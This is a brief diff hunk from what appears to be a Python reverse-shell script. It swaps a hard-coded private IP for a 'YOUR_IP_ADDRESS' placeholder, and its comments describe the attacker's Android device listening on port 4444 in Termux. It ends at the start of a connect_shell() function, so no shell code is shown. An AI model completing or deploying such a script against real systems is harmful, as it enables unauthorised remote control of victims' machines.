@@ -3,7 +3,7 @@ import subprocess
 import time
 
 # Set up the IP and port of the attacker's machine (your Android device)
-attacker_ip = '192.168.0.113'  # Replace with your Android device's IP
+attacker_ip = 'YOUR_IP_ADDRESS'  # Replace with your Android device's IP
 attacker_port = 4444  # The port you are listening on in Termux
 
 def connect_shell():
